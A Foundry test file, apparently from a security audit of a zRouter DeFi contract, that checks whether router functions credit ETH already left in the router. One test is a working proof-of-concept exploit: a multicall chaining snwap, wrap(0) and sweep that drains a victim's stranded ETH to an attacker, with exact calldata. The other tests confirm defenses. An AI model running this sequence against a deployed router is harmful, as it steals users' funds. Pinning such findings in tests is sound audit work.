// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { zRouter, ChainConfig } from "../../../src/peripherals/zRouter.sol";

/// @dev WETH9 as far as these legs touch it: `wrap` moves ETH to it through a raw value call with
///      empty calldata and `sweep` ERC-20-transfers the wrapped balance out.
contract StubWETH {
    mapping(address => uint256) public balanceOf;

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/**
 * @title H03_ZRouterOtherCredits
 * @notice Round 2 pinned `wrap(0)`: it credits the router's whole resting ETH balance as THIS
 *         caller's transient credit, so a later T4 caller sweeps value a previous transaction left
 *         behind. This file settles the follow-up: does any OTHER `depositFor` site credit an amount
 *         that includes value already resting in the router?
 *
 *         Every read-side candidate was walked; each credits only this leg's own delta:
 *         - swapV2/V3/V4/Curve output legs credit the venue-reported `amountOut`; their leftover-input
 *           refunds are bounded by `_changeOver` against a baseline taken before the leg (pinned in
 *           ZRouterRefundBoundedToOwnChange).
 *         - swapVZ's chaining leg credits the returned `amountOut`; its exact-out refund is now pure
 *           arithmetic (`amountLimit - amountIn`), not a balance read.
 *         - `deposit`, both permit2 helpers, and `wrap(>0)` credit an argument that was just paid in
 *           (payment checked) or sent out the same line.
 *         - `revealName` reads `address(this).balance` but only SPENDS a credit; it never mints one.
 *         - The most suspicious read left: `snwap`/`snwapMulti`'s output leg, which with
 *           `recipient == address(this)` credits `finalBalance - initialBalance` where `initialBalance`
 *           is a live read of the ROUTER's own balance — resting wei included.
 *
 *         That site does mint a resting-sized credit — proved below: an attacker who chains snwap
 *         into `wrap(0)` + sweep in one transaction leaves with the victim's resting ETH for gas
 *         alone, no prior transaction needed beyond the stranding H02 pins. But the site is DEFENDED
 *         against spending that credit on raw ETH inside its own call: the credit lands on the
 *         (address(0), 0) slot only AFTER the executor returns, and the one branch that consumes it
 *         before — snwap's zero-`amountIn` input leg — runs first and reverts Unauthorized on a
 *         balance this transaction never staged. A bare snwap moves nothing; the wrap route does,
 *         and both are pinned with exact numbers.
 */
contract H03ZRouterOtherCreditsTest is Test {
    StubWETH internal weth;
    zRouter internal router;

    address internal owner = address(uint160(0x0FF1CE));
    address internal attacker = address(uint160(0xBAD1));

    /// @dev The resting stake H02 strands: a 1 ETH exact-out overpayment with `to == router` and a
    ///      1 wei fill. Its shape is pinned there; here it is simply what rests in the router.
    uint256 internal constant STRANDED = 1 ether - 1 wei;

    function setUp() public {
        weth = new StubWETH();

        ChainConfig memory c;
        c.weth = address(weth);
        router = new zRouter(c, owner);

        // The victim's stranded change, placed directly — the stranding flow itself is H02's claim.
        vm.deal(address(router), STRANDED);
    }

    /// THE MOST SUSPICIOUS SITE, DEFENDED. `snwap` with `tokenIn == address(0)` (so the guarded
    /// zero-`amountIn` input branch never runs — it would revert Unauthorized on a resting balance
    /// alone), `recipient == address(this)`, and an executor that keeps every wei: the leg pays out
    /// nothing, yet the output credit mints the router's WHOLE resting balance as this transaction's
    /// money. The mint is real — proved below by `wrap(0)` inside the same call, which converts that
    /// credit into a sweep of the victim's ETH to the attacker. What saves the value is ORDERING:
    /// every branch that could spend the credit (the input leg, any later sweep) runs before the
    /// credit is minted or outside the transaction, so on its own this call moves nothing.
    function test_Defended_SnwapRestingSizedCreditCannotBeSweptInSameTx() public {
        assertEq(attacker.balance, 0, "the attacker starts with nothing");

        bytes memory executorData = abi.encodeWithSignature("hold()"); // keeps every wei it receives

        vm.prank(attacker);
        router.snwap(address(0), 0, address(router), address(0), 0, attacker, executorData);

        assertEq(address(router).balance, STRANDED, "the bare snwap moved nothing");
        assertEq(attacker.balance, 0, "and the T4 caller paid nothing and took nothing");

        // The minted credit is real and visible to a later leg of the same transaction —
        // delegatecall shares transient storage — yet a direct `sweep` of raw ETH still refuses it.
        // Sweep pays ETH out, and the only in-call branch that consumes an (address(0), 0) credit
        // before the sweep leg is snwap's own zero-`amountIn` input leg, which `tokenIn == address(0)`
        // skips; measured, the gate refuses. The escape hatch sits one line below: spend the same
        // value through wrap first and it pays.
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature(
            "snwap(address,uint256,address,address,uint256,address,bytes)",
            address(0), 0, address(router), address(0), 0, attacker, executorData
        );
        calls[1] = abi.encodeCall(zRouter.sweep, (address(0), 0, STRANDED, attacker));

        vm.prank(attacker);
        vm.expectRevert(zRouter.Unauthorized.selector);
        router.multicall(calls);

        assertEq(address(router).balance, STRANDED, "the victim's resting ETH stayed where it was");
    }

    /// The mint itself, proven rather than inferred: the same snwap credit DOES pay when spent
    /// through `wrap(0)` in the same transaction — wrap moves the router's balance to WETH and
    /// mints a WETH credit that sweep honours. A T4 caller who chains snwap into wrap+sweep leaves
    /// with the victim's resting ETH for gas alone. This is why the defense above is an ordering
    /// accident and not a property of the credit: recorded so the next pass starts here.
    function test_Attacker_SameCreditPaysWhenSpentThroughWrapInTheSameCall() public {
        bytes memory executorData = abi.encodeWithSignature("hold()");

        bytes[] memory calls = new bytes[](3);
        calls[0] = abi.encodeWithSignature(
            "snwap(address,uint256,address,address,uint256,address,bytes)",
            address(0), 0, address(router), address(0), 0, attacker, executorData
        );
        calls[1] = abi.encodeCall(zRouter.wrap, (0)); // mints the WETH credit sweep actually spends
        calls[2] = abi.encodeCall(zRouter.sweep, (address(weth), 0, STRANDED, attacker));

        vm.prank(attacker);
        router.multicall(calls);

        assertEq(weth.balanceOf(attacker), STRANDED, "the attacker ends with the victim's resting ETH");
        assertEq(address(router).balance, 0, "and the victim's stake left the router");
    }

    /// The same walk on `snwapMulti`, which carries a verbatim copy of the output-credit leg — pinned
    /// so the verdict covers both copies rather than one.
    function test_Defended_SnwapMultiRestingSizedCreditCannotBeSweptInSameTx() public {
        address[] memory tokensOut = new address[](1);
        tokensOut[0] = address(0);
        uint256[] memory amountsOutMin = new uint256[](1);

        bytes memory executorData = abi.encodeWithSignature("hold()");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature(
            "snwapMulti(address,uint256,address,address[],uint256[],address,bytes)",
            address(0), 0, address(router), tokensOut, amountsOutMin, attacker, executorData
        );
        calls[1] = abi.encodeCall(zRouter.sweep, (address(0), 0, STRANDED, attacker));

        vm.prank(attacker);
        vm.expectRevert(zRouter.Unauthorized.selector);
        router.multicall(calls);

        assertEq(address(router).balance, STRANDED, "the victim's resting ETH stayed where it was");
        assertEq(attacker.balance, 0, "and the T4 caller paid nothing and took nothing");
    }

    /// Non-vacuity of the harness: the same multicall shape WITHOUT the snwap leg is refused — the
    /// sweep gate does close an empty-credit transaction. The attack above runs on the credit snwap
    /// minted, not on any weakness in the gate itself.
    function test_Defended_WrapAndSweepOnAnEmptyCreditIsRefused() public {
        vm.deal(address(router), 0);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0));
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, STRANDED, attacker));

        vm.prank(attacker);
        vm.expectRevert(zRouter.Unauthorized.selector);
        router.multicall(calls);
    }
}
